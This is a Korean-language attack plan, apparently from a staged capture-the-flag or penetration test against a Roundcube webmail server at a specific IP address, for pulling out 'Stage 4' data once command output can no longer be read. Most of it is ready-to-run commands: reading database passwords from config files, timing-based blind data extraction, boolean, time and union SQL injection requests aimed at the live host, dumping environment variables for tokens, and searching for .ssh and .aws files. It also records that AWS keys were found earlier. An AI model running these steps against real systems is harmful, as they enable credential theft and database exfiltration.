# 대체 SAST 벡터 (stdout 회수 불가 대응)

## 1. MySQL 데이터베이스 직접 접근 ⭐ (추천)

### 전략
- Roundcube는 MySQL을 사용
- 설정 파일에서 DB 연결 정보 추출
- Stage 4 정보가 DB에 저장되었을 가능성

### 실행
```bash
# Step 1: Roundcube 설정 파일 위치 확인
curl http://13.125.104.131:30083/config/config.inc.php  # 직접 접근

# Step 2: DB 정보 추출 (타이밍)
if [ -f /usr/share/roundcube/config/config.inc.php ]; then sleep 3; fi

# Step 3: MySQL 연결 테스트
mysql -h localhost -u roundcube -p 2>&1 | head -1

# Step 4: DB 쿼리 (Stage 4 정보)
mysql -h localhost -u roundcube roundcube -e \
  "SELECT * FROM users WHERE username='testuser' LIMIT 1;"

# Step 5: 모든 테이블 조회
mysql -h localhost -u roundcube roundcube -e "SHOW TABLES;"
```

### 기대 결과
- DB 호스트, 사용자명, 비밀번호
- roundcube DB의 users, preferences, messages 테이블
- Stage 4 정보 또는 플래그

---

## 2. Roundcube 설정 파일 분석 (SAST)

### 위치
```
/usr/share/roundcube/config/config.inc.php
/etc/roundcube/config.php
/var/www/roundcube/config.php
```

### 추출할 정보
```php
// 암호화 키
$config['des_key'] = '...';

// DB 정보
$config['db_dsnw'] = 'mysql://user:pass@host/db';
$config['db_host'] = 'localhost';
$config['db_name'] = 'roundcube';

// IMAP/SMTP
$config['imap_host'] = '...';
$config['smtp_host'] = '...';

// 플러그인
$config['plugins'] = array(...);

// 환경 변수
getenv('AWS_...')
getenv('STAGE...')
```

### 명령
```bash
cat /usr/share/roundcube/config/config.inc.php | grep -E 'db_|des_key|password' | head -20

# 또는 타이밍으로
if grep -q "db_name" /usr/share/roundcube/config/config.inc.php; then
  sleep 3  # 파일 존재
else
  sleep 6  # 파일 없음
fi
```

---

## 3. Roundcube HTTP 페이지에서 정보 추출

### 이미 확보한 것
```
encryption_pane.html  → Mailvelope, 암호화 옵션
identities.json       → 사용자 정보
filters.json          → 필터 설정
inbox_msglist.json    → 메일 메타
about.html            → 버전/플러그인 정보
```

### 재분석할 항목
- `about.html` → 활성 플러그인, 설정
- HTTP 헤더 → X-Powered-By, Server 정보
- 숨겨진 폼 필드 → CSRF 토큰 외 정보
- error_log → 오류 메시지에서 경로/설정 노출

### 명령
```bash
curl -s http://13.125.104.131:30083/about | grep -oE '<li.*?</li>' | head -20

curl -I http://13.125.104.131:30083/ | grep -E '^(Server|X-|Set-Cookie)'
```

---

## 4. SQLi를 통한 정보 추출

### 벡터
- Roundcube의 설정/필터 저장 기능
- contact 검색
- folder 조회

### 기본 테스트
```bash
# Boolean-based SQLi
curl "http://13.125.104.131:30083/?_task=contacts&_search=*' OR '1'='1"

# Time-based SQLi
curl "http://13.125.104.131:30083/?_id=1' AND SLEEP(5) -- -"

# Union-based
curl "http://13.125.104.131:30083/?_id=1 UNION SELECT ..."
```

### Stage 4 정보 추출
```sql
-- Roundcube users 테이블
SELECT user_id, username, mail_host FROM users;

-- preferences에서 stage4 관련 정보
SELECT * FROM preferences 
WHERE prefs_name LIKE '%stage%' OR prefs_name LIKE '%flag%';

-- messages 또는 contacts에서
SELECT * FROM messages WHERE subject LIKE '%stage4%';
```

---

## 5. 환경 변수 재탐색

### 이전에 발견한 것
```
AWS_ACCESS_KEY_ID=AKIA[REDACTED-ACCESS-KEY]
AWS_SECRET_ACCESS_KEY=[REDACTED-SECRET-KEY]
AWS_DEFAULT_REGION=us-east-1
```

### 새로운 탐색
```bash
# /proc/self/environ에서 직접 읽기
cat /proc/self/environ | tr '\0' '\n' | grep -iE 'stage|flag|token|endpoint'

# 또는 env 명령
env | grep -iE 'stage|flag|token|endpoint|internal'

# PHP 상에서
phpinfo() | grep 'Environment';
$_ENV['STAGE4_FLAG'];
```

---

## 6. 파일 시스템 탐색

### Stage 4 플래그 위치 추측
```bash
# 이전: /usr/share/flag* 발견

# 새로운 위치 탐색
find / -name "*flag*" -o -name "*stage4*" -o -name "*secret*" 2>/dev/null | head -20

# 특정 디렉토리
ls -la /opt/
ls -la /srv/
ls -la /root/
find /home -name ".aws" -o -name ".ssh" 2>/dev/null
```

### 권한 확인
```bash
ls -la /var/www/
ls -la /usr/share/roundcube/
ls -la /tmp/
```

---

## 우선순위 순서

1. **MySQL 직접 접근** (가능성: 80%, 난이도: 중)
   - DB에 Stage 4 정보 저장되었을 가능성 높음
   - 타이밍 또는 설정 파일로 연결 정보 확보

2. **설정 파일 분석** (가능성: 60%, 난이도: 낮)
   - /usr/share/roundcube/config/config.inc.php 읽기
   - DB 호스트, 암호화 키 등 추출

3. **내부 프록시 API 해석** (가능성: 100%, 난이도: 중)
   - 이미 응답 확인됨 (3.5초)
   - POST 요청, 헤더 추가, 인증 시도로 상세 응답 유도

4. **SQLi** (가능성: 40%, 난이도: 높음)
   - Roundcube 표준 기능에서 취약점 찾기
   - 커스텀 코드에서 취약점 가능성

5. **파일 시스템 탐색** (가능성: 50%, 난이도: 낮)
   - flag 파일 직접 위치 파악
   - Stage 4 관련 파일 검색

---

## 다음 실행 계획

### 이번에 시도할 것
1. MySQL 연결 정보 추출 (타이밍)
2. /usr/share/roundcube/config/config.inc.php 읽기
3. DB 테이블 스키마 조회
4. Stage 4 데이터 직접 쿼리

### 명령 순서
```bash
# 1. MySQL 존재 확인
timeout 2 bash -c 'mysql -h localhost -u root 2>&1' | head -1

# 2. Roundcube DB 사용자 확인
grep "db_user\|db_pass\|db_host" /usr/share/roundcube/config/config.inc.php

# 3. DB 쿼리 실행
mysql -h localhost -u roundcube -p$(cat /path/to/password.txt) roundcube \
  -e "SELECT * FROM information_schema.TABLES WHERE TABLE_SCHEMA='roundcube';"

# 4. Stage 4 데이터 조회
mysql roundcube -e "SELECT * FROM users; SHOW TABLES;"
```

